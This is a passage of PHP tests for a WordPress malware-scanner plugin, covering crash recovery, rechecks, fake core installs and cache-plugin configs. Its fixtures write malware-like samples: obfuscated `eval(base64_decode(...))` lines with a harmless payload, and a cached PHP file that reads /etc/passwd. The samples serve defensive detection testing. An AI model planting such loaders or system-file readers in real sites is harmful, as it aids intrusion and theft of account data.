		$small = $this->walk($this->noStore(), ['themes'], [], ['code_bytes' => 4096]);
		
		return $this->verdicts($walked, 'agency/functions.php') === ['include_foreign urgent']
			&& $this->verdicts($walked, 'agency/inc/big.php') === []
			&& $this->verdicts($small, 'agency/inc/big.php') === ['oversize_php info']
			&& in_array('oversize_php info', $this->verdicts($small, 'agency/functions.php'), true);
	}
	
	/**
	 * RULE: a WordPress install in a folder is one with its core files, not
	 * directories of the right names: a wp-login.php beside empty wp-admin
	 * and wp-includes is mimic_core, and so is one beside directories named
	 * wp-settings.php and wp-includes/version.php, or beside wp-settings.php
	 * alone; beside both files it is the install's own. Falsify: ask only
	 * whether the paths exist (the copy beside the two directories reads
	 * clean); ask for wp-settings.php alone (the copy beside it reads clean).
	 */
	public function aWordPressInstallIsKnownByItsFiles(): bool
	{
		$this->write($this->root . '/old/wp-login.php', "<?php echo 1;");
		mkdir($this->root . '/old/wp-admin', 0700, true);
		mkdir($this->root . '/old/wp-includes', 0700, true);
		$this->write($this->root . '/blog/wp-login.php', "<?php echo 1;");
		$this->write($this->root . '/blog/wp-settings.php', "<?php echo 1;");
		$this->write($this->root . '/blog/wp-includes/version.php', "<?php \$wp_version = '6.0';");
		mkdir($this->root . '/blog/wp-admin', 0700, true);
		$this->write($this->root . '/named/wp-login.php', "<?php echo 1;");
		mkdir($this->root . '/named/wp-settings.php', 0700, true);
		mkdir($this->root . '/named/wp-includes/version.php', 0700, true);
		$this->write($this->root . '/half/wp-login.php', "<?php echo 1;");
		$this->write($this->root . '/half/wp-settings.php', "<?php echo 1;");
		$walked = $this->walk($this->noStore(), ['root']);
		
		return $this->verdicts($walked, 'old/wp-login.php') === ['mimic_core high']
			&& $this->verdicts($walked, 'named/wp-login.php') === ['mimic_core high']
			&& $this->verdicts($walked, 'half/wp-login.php') === ['mimic_core high']
			&& $this->verdicts($walked, 'blog/wp-login.php') === [];
	}
	
	/**
	 * RULE: before a large file is judged its name alone is handed to the
	 * checkpoint — area, path and size, nothing of the pass — and once it is
	 * judged the checkpoint is cleared. A chunk that dies judging it leaves
	 * that name; the next chunk, resumed from the pass as the last chunk
	 * began it with the name beside it, names the file scan_crash (high) and
	 * walks on without it, every other file reported once. A chunk that dies
	 * on a later file leaves no name and blames none. Falsify: hand the
	 * checkpoint the whole pass (the marker carries more than the file);
	 * resume without passing over the named file (it is judged again); leave
	 * the name once the file is judged (the later death is blamed on it).
	 */
	public function aFileThatKillsTheScanIsNamedNotJudgedAgain(): bool
	{
		$theme = $this->roots['themes'] . '/agency/inc';
		$this->write($theme . '/a.php', "<?php\n@eval(base64_decode('ZWNobyAxOw=='));\n");
		$this->write($theme . '/boom.php', "<?php\n\$a = '" . str_repeat('y', 2048) . "';\n");
		$this->write($theme . '/z.php', "<?php\n@eval(base64_decode('ZWNobyAxOw=='));\n");
		$scan = $this->dying();
		$marks = [];
		$scan->checkpoint = static function(?array $judging) use (&$marks): void
		{
			$marks[] = $judging;
		};
		$begun = $this->begun($scan, ['themes']);
		
		try
		{
			$scan->advance($begun, 10_000);
			
			return false;
		}
		catch(RuntimeException)
		{
			// the chunk died; the pass as it began and the name are all the next one has
		}
		
		$named = end($marks);
		
		if(is_array($named) === false || array_keys($named) !== ['area', 'path', 'size'] || str_ends_with((string)$named['path'], '/boom.php') === false)
		{
			return false;
		}
		
		$walked = $scan->advance($begun + ['judging' => $named], 10_000);
		// the name is the stored option's, read as data: an area the pass has not is the root's
		$stray = $scan->advance(['phases' => []] + $begun + ['judging' => ['area' => 'nowhere', 'path' => '/x.php']], 10_000);
		
		if(($walked['done'] === true
			&& $this->verdicts($stray, '/x.php') === ['scan_crash high']
			&& $this->verdicts($walked, 'agency/inc/boom.php') === ['scan_crash high']
			&& $this->verdicts($walked, 'agency/inc/a.php') === ['eval_chain high']
			&& $this->verdicts($walked, 'agency/inc/z.php') === ['eval_chain high']) === false)
		{
			return false;
		}
		
		// a chunk that dies after the large file was judged
		$marks = [];
		$scan->dies = '/z.php';
		$begun = $this->begun($scan, ['themes']);
		
		try
		{
			$scan->advance($begun, 10_000);
			
			return false;
		}
		catch(RuntimeException)
		{
			// the chunk died on z.php, past boom.php
		}
		
		if(end($marks) !== null || count($marks) !== 2)
		{
			return false;
		}
		
		$scan->dies = '';
		$walked = $scan->advance($begun, 10_000);
		
		return $walked['done'] === true
			&& $this->verdicts($walked, 'agency/inc/boom.php') === []
			&& $this->verdicts($walked, 'agency/inc/a.php') === ['eval_chain high']
			&& $this->verdicts($walked, 'agency/inc/z.php') === ['eval_chain high'];
	}
	
	/**
	 * RULE: the database's checks are named to the checkpoint like a large
	 * file and cleared once they ran: a chunk that dies in them leaves them
	 * named, and the next chunk names them scan_crash (high) and finishes the
	 * pass without reading them again; a chunk that dies after them, in the
	 * posture, leaves no name, so the next one reads them again and keeps
	 * their findings. Falsify: no name before the checks (the dead chunk
	 * leaves nothing); read them again on recovery (they run twice); leave
	 * the name once they ran (the posture's death is blamed on them and their
	 * findings are lost).
	 */
	public function aDatabaseThatKillsTheScanIsNamedNotReadAgain(): bool
	{
		$scan = $this->dying();
		$marks = [];
		$scan->checkpoint = static function(?array $judging) use (&$marks): void
		{
			$marks[] = $judging;
		};
		$scan->dies = 'database';
		$begun = $this->begun($scan, [Database::AREA, 'posture']);
		
		try
		{
			$scan->advance($begun, 10_000);
			
			return false;
		}
		catch(RuntimeException)
		{
			// the chunk died in the checks
		}
		
		if((end($marks)['path'] ?? '') !== 'checks')
		{
			return false;
		}
		
		$scan->dies = '';
		$walked = $scan->advance($begun + ['judging' => end($marks)], 10_000);
		
		if(($walked['done'] === true && $scan->runs === 1 && $this->verdicts($walked, 'checks') === ['scan_crash high']) === false)
		{
			return false;
		}
		
		// the checks ran, the posture after them died
		$marks = [];
		$scan->runs = 0;
		$scan->dies = 'posture';
		$begun = $this->begun($scan, [Database::AREA, 'posture']);
		
		try
		{
			$scan->advance($begun, 10_000);
			
			return false;
		}
		catch(RuntimeException)
		{
			// the chunk died after the checks
		}
		
		$scan->dies = '';
		$walked = $scan->advance($begun + (is_array(end($marks)) ? ['judging' => end($marks)] : []), 10_000);
		
		return end($marks) === null
			&& $walked['done'] === true
			&& $scan->runs === 2
			&& $this->verdicts($walked, 'checks') === []
			&& $this->verdicts($walked, 'options/x') === ['option_code high'];
	}
	
	/**
	 * RULE: a chunk keeps to its deadline between files, not only between
	 * directories: a directory of slow files is judged across chunks, the
	 * directory going back on the walk with the names it has judged, and
	 * every file is judged once. Falsify: check the deadline between
	 * directories alone (one chunk judges the whole directory).
	 */
	public function aChunkStopsBetweenFilesAtItsDeadline(): bool
	{
		foreach(range(1, 5) as $index)
		{
			$this->write($this->roots['themes'] . '/agency/inc/f' . $index . '.php', '<?php echo ' . $index . ';');
		}
		
		$scan = $this->dying();
		$scan->slow = 40_000;
		$state = $this->begun($scan, ['themes']);
		$chunks = 0;
		
		while($state['done'] === false && $chunks < 20)
		{
			$state = $scan->advance($state, 50);
			$chunks++;
		}
		
		$judged = array_count_values(array_map('basename', $scan->judged));
		
		return $state['done'] === true
			&& $chunks >= 3
			&& $judged === ['f1.php' => 1, 'f2.php' => 1, 'f3.php' => 1, 'f4.php' => 1, 'f5.php' => 1];
	}
	
	/**
	 * RULE: a pass that does not reach the part of a bounded walk where an
	 * earlier pass found something reads those files again before the
	 * database, so its report still carries every finding it knows — the
	 * console takes what a complete report leaves out for gone — and counts
	 * them in `rechecked`; a file gone or cleaned since is gone from the
	 * report too, and is not read again after. Falsify: read only what the
	 * walk reaches (the shell drops out of the next pass's report while it
	 * is still there); carry the finding without reading the file (the
	 * deleted shell stays listed).
	 */
	public function aFindingBeyondThisPassIsReadAgain(): bool
	{
		$cache = $this->roots['content'] . '/cache';
		
		foreach(range(1, 30) as $page)
		{
			$this->write($cache . '/pages/p' . str_pad((string)$page, 2, '0', STR_PAD_LEFT) . '/index.html', 'x');
		}
		
		$this->write($cache . '/aa/deep.php', "<?php echo file_get_contents('/etc/passwd');");
		$areas = ['content', 'recheck'];
		$limits = ['cache_entries' => 10];
		$resume = [];
		$found = null;
		
		foreach(range(1, 12) as $pass)
		{
			$walked = $this->walk($this->noStore(), $areas, [], $limits, $resume);
			$resume = $walked['resume_next'] ?? [];
			
			if($this->verdicts($walked, 'cache/aa/deep.php') !== [])
			{
				$found = $walked;
				
				break;
			}
		}
		
		$next = $this->walk($this->noStore(), $areas, [], $limits, $resume);
		$plain = $this->walk($this->noStore(), ['content'], [], $limits, $resume);
		$report = $this->scanner($this->noStore())->report($next, 'wordpress/test');
		// a walk that reaches the file itself reads it once
		$whole = $this->walk($this->noStore(), $areas, [], ['cache_entries' => 1000], $next['resume_next'] ?? []);
		$this->write($cache . '/aa/deep.php', "<?php exit; ?>\n");
		$cleaned = $this->walk($this->noStore(), $areas, [], $limits, $next['resume_next'] ?? []);
		$this->write($cache . '/aa/deep.php', "<?php echo file_get_contents('/etc/passwd');");
		$again = $this->walk($this->noStore(), $areas, [], $limits, $next['resume_next'] ?? []);
		unlink($cache . '/aa/deep.php');
		$gone = $this->walk($this->noStore(), $areas, [], $limits, $again['resume_next'] ?? []);
		
		return $found !== null
			&& $this->verdicts($next, 'cache/aa/deep.php') === ['cache_php high']
			&& $next['areas']['content']['files'] === $plain['areas']['content']['files']
			&& $this->verdicts($whole, 'cache/aa/deep.php') === ['cache_php high']
			&& $whole['rechecked'] === 0
			&& ($report['scan']['rechecked'] ?? 0) >= 1
			&& $report['scan']['complete'] === true
			&& $this->verdicts($cleaned, 'cache/aa/deep.php') === []
			&& $this->verdicts($again, 'cache/aa/deep.php') === ['cache_php high']
			&& $this->verdicts($gone, 'cache/aa/deep.php') === []
			&& ($gone['resume_next']['recheck'] ?? []) === [];
	}
	
	/**
	 * RULE: a pass the plugin's last version stored, without the keys this
	 * one keeps — the bounded walks, the resume points, the poisoned files,
	 * the files to read again — runs on to its end. Falsify: read the new
	 * keys unguarded (the stored pass dies on the first file).
	 */
	public function aPassAnOlderVersionStoredRunsOn(): bool
	{
		$this->write($this->roots['themes'] . '/agency/inc/a.php', "<?php\n@eval(base64_decode('ZWNobyAxOw=='));\n");
		$this->write($this->roots['content'] . '/cache/aa/x.php', "<?php echo file_get_contents('/etc/passwd');");
		$scan = $this->scanner($this->noStore());
		$state = $this->begun($scan, ['themes', 'content']);
		
		foreach(['bounded', 'resume', 'resume_next', 'poisoned', 'config_read', 'recheck_next', 'recheck_at', 'rechecked'] as $key)
		{
			unset($state[$key]);
		}
		
		$walked = $scan->advance($state, 10_000);
		$report = $scan->report($walked, 'wordpress/test');
		
		return $walked['done'] === true
			&& $this->verdicts($walked, 'agency/inc/a.php') === ['eval_chain high']
			&& $this->verdicts($walked, 'cache/aa/x.php') === ['cache_php high']
			&& $report['scan']['complete'] === true;
	}
	
	/** a pass of $scan over $areas alone, as start() begins it */
	protected function begun(
		PluginScan $scan,
		array $areas,
	): array
	{
		$state = $scan->start('manual');
		$state['phases'] = array_values(array_filter($state['phases'], static fn(array $phase): bool => in_array($phase[0], $areas, true)));
		$state['checksums']['core'] = 'unavailable';
		
		return $state;
	}
	
	/**
	 * A scan over the test's tree whose chunks die where a test says: on a
	 * file whose path ends with `dies`, in the database's checks or in the
	 * posture; that judges each file `slow` microseconds and lists it in
	 * `judged`, and whose checks count their runs and find options/x
	 */
	protected function dying(): PluginScan
	{
		return new class(new Config, $this->roots) extends PluginScan
		{
			public string $dies = '/boom.php';
			
			public int $slow = 0;
			
			public int $runs = 0;
			
			/** @var list<string> */
			public array $judged = [];
			
			public function __construct(
				Config $config,
				protected array $tree,
			)
			{
				parent::__construct($config);
			}
			
			public function roots(): array
			{
				return $this->tree;
			}
			
			public function pluginVersions(): array
			{
				return [];
			}
			
			protected function limit(
				string $name,
			): int
			{
				return $name === 'checkpoint_bytes' ? 1024 : parent::limit($name);
			}
			
			protected function inspectCode(
				array &$state,
				string $area,
				string $path,
				array $meta,
				?string $source = null,
			): bool
			{
				// the fatal a real file causes, as a test can raise it
				if($this->dies !== '' && str_ends_with($path, $this->dies))
				{
					throw new RuntimeException('died judging');
				}
				
				$this->judged[] = $path;
				usleep($this->slow);
				
				return parent::inspectCode($state, $area, $path, $meta, $source);
			}
			
			protected function databaseReady(
				array &$state,
			): bool
			{
				return true;
			}
			
			protected function database(
				array &$state,
			): void
			{
				$this->runs++;
				
				if($this->dies === 'database')
				{
					// the fatal a huge table causes, as a test can raise it
					throw new RuntimeException('died reading the database');
				}
				
				$this->finding($state, Database::AREA, 'options/x', 'option_code', self::TIER_HIGH);
			}
			
			protected function posture(
				array &$state,
			): void
			{
				if($this->dies === 'posture')
				{
					throw new RuntimeException('died reading the posture');
				}
			}
		};
	}
	
	/**
	 * RULE: what caching and security plugins write into wp-content beside the
	 * cache reads as their data: Breeze's guarded config, WP-Optimize's
	 * guarded json_decode() config, Cache Enabler's settings array are data
	 * only (inert_php, info), Autoptimize's 404 handler is its own while
	 * Autoptimize is installed, and a dotfile a wp.org plugin's list ships is
	 * verified, never hidden_php; one beside it the list does not name is
	 * hidden_php. Falsify: call data a stranger (the three configs are
	 * content_php); judge a dotfile before its list (the listed file is
	 * hidden_php); take any file of a verified plugin for a listed one (the
	 * unlisted dotfile passes).
	 */
	public function whatPluginsWriteBesideTheCacheIsTheirs(): bool
	{
		$content = $this->roots['content'];
		$this->write($content . '/breeze-config/breeze-config.php', "<?php \n\r defined( 'ABSPATH' ) || exit; \n\r return array (\n  'breeze-active' => '1',\n); \n\r");
		$this->write($content . '/wpo-cache/config/config-example.com.php', "<?php\nif (!defined('ABSPATH')) die('No direct access allowed');\n\n\$GLOBALS['wpo_cache_config'] = json_decode('{\"enable_page_caching\":true}', true);\n");
		$this->write($content . '/settings/cache-enabler/example.com.php', "<?php\n/**\n * The settings file for Cache Enabler.\n */\n\nreturn array (\n  'version' => '1.8.15',\n  'cache_expires' => 0,\n);");
		$this->write($content . '/autoptimize_404_handler.php', "<?php\n\$original_request = strtok(\$_SERVER['REQUEST_URI'], '?');\nheader('HTTP/1.1 410 Gone');\nexit();\n");
		mkdir($this->roots['plugins'] . '/autoptimize', 0700, true);
		$dotfile = "<?php\nnamespace WebSharks;\nfunction load(): void {}\n";
		$this->write($this->roots['plugins'] . '/comet-cache/src/includes/.load.php', $dotfile);
		$this->write($this->roots['plugins'] . '/comet-cache/src/includes/.x.php', '<?php echo 1;');
		$GLOBALS['wp']['api'] = ['files' => ['src/includes/.load.php' => ['md5' => md5($dotfile)]]];
		$walked = $this->walk($this->noStore(), ['content', 'plugins'], ['comet-cache' => '1.0']);
		
		return $this->verdicts($walked, 'breeze-config/breeze-config.php') === ['inert_php info']
			&& $this->verdicts($walked, 'wpo-cache/config/config-example.com.php') === ['inert_php info']
			&& $this->verdicts($walked, 'settings/cache-enabler/example.com.php') === ['inert_php info']
			&& $this->verdicts($walked, 'autoptimize_404_handler.php') === ['dropin info']
			&& $this->verdicts($walked, 'comet-cache/src/includes/.load.php') === []
			&& $this->verdicts($walked, 'comet-cache/src/includes/.x.php') === ['hidden_php high']
			&& $walked['areas']['plugins']['verified'] === 1;
	}
}
